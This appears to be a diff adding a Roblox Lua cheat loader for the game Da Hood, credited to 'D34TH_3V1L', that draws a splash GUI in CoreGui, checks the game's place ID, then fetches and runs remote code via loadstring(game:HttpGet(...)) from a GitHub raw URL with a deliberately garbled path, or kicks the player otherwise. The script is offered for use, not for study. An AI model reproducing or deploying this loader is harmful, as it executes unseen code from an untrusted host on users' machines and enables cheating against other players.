@@ -1,0 +1,108 @@
+
+--[[ 
+Made By: D34TH_3V1L
+]]--
+
+
+pcall(function()
+
+
+-- Instances:
+
+local D34THCarga = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+D34THCarga.Name = "D34THCarga"
+D34THCarga.Parent = game.CoreGui
+
+Frame.Parent = D34THCarga
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+Frame.BorderColor3 = Color3.fromRGB(170, 0, 0)
+Frame.BorderSizePixel = 5
+Frame.Position = UDim2.new(0.485515654, 0, 0.474097311, 0)
+Frame.Size = UDim2.new(0, 345, 0, 222)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(170, 0, 0)
+TextLabel.BorderSizePixel = 3
+TextLabel.Position = UDim2.new(0.20869565, 0, 0.0495495498, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.PatrickHand
+TextLabel.Text = "D34TH_3V1L"
+TextLabel.TextColor3 = Color3.fromRGB(179, 179, 179)
+TextLabel.TextSize = 38.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(76, 76, 76)
+TextLabel_2.BorderSizePixel = 3
+TextLabel_2.Position = UDim2.new(0.104347825, 0, 0.315315306, 0)
+TextLabel_2.Size = UDim2.new(0, 273, 0, 61)
+TextLabel_2.Font = Enum.Font.IndieFlower
+TextLabel_2.Text = "No more paid scripts or premium commands"
+TextLabel_2.TextColor3 = Color3.fromRGB(77, 77, 77)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 38.000
+TextLabel_2.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Position = UDim2.new(0.0202898551, 0, 0.657657683, 0)
+TextButton.Size = UDim2.new(0, 329, 0, 65)
+TextButton.Font = Enum.Font.PermanentMarker
+TextButton.Text = ":)"
+TextButton.TextColor3 = Color3.fromRGB(170, 0, 0)
+TextButton.TextScaled = true
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+-- Scripts:
+
+local function BIVR_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	local checking = script.Parent
+
+	checking.Text = 'Hi'
+
+	wait(1)
+	checking.Text = 'Scripting your world'
+	wait(3)
+	checking.Text = 'checking game.'
+	wait(1)
+	checking.Text = 'checking game. .'
+	wait(1)
+	checking.Text = 'checking game. . .'
+	wait(1)
+
+	if game.PlaceId == 2788229376 then -- checks the game id
+		checking.Text = 'game not found'
+		wait(1)
+		checking.Text = 'Done [Da Hood]'
+		wait(2)
+		checking.Text = 'Thanks for using my script.'
+		wait(2)
+		Frame.Visible = false
+    
+-- Code Here:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kaka0221/KSAKJDSAKKSDKJSDAJKL-DASLJK-DASKJLSDALJKSDALKJSDALJK-DASLJK-DSA/main/a%C3%B1sldmk%C3%B1laksmdj%C3%B1aksljd%C3%B1lakjs%C3%B1dkjsa%C3%B1ldkjas%C3%B1lkdj%C3%B1lakjsd%C3%B1lkajdl%C3%B1kajsdlkja%C3%B1slkdjas%C3%B1lkdj%C3%B1laksdj%C3%B1asjkd%C3%B1asjd%C3%B1slakjd%C3%B1alk", true))()
+
+else
+		checking.Text = 'game not found'
+		wait(2)
+		checking.Text = 'This game is not supported'
+		wait(5)
+		game.Players.LocalPlayer:Kick("This script only works for Da Hood ._.") -- change the text to whatever
+	end	
+end
+end)
